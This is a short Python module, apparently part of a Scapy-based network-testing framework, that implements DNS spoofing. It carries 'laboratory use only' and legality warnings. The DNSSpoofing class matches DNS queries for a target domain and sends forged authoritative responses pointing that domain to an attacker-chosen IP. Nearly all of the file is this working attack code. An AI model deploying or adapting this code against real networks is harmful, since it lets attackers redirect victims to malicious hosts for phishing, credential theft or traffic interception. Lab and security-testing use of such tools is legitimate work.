"""
DNS Spoofing Module
⚠️  LABORATORY USE ONLY ⚠️
"""
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
from scapy_framework.core.logger import get_logger

logger = get_logger(__name__)

ETHICAL_WARNING = """
⚠️  ETHICAL WARNING ⚠️
DNS spoofing is ILLEGAL without authorization.
Use only in controlled lab environments.
"""

class DNSSpoofing:
    """DNS spoofing for testing"""
    def __init__(self, target_domain: str, fake_ip: str):
        print(ETHICAL_WARNING)
        self.target_domain = target_domain
        self.fake_ip = fake_ip
    
    def spoof(self, packet):
        """Spoof DNS response"""
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode()
            if self.target_domain in qname:
                logger.warning(f"Spoofing DNS query for {qname}")
                # Create fake response
                spoofed = IP(dst=packet[IP].src, src=packet[IP].dst)/                         UDP(dport=packet[UDP].sport, sport=53)/                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=self.fake_ip))
                send(spoofed, verbose=0)
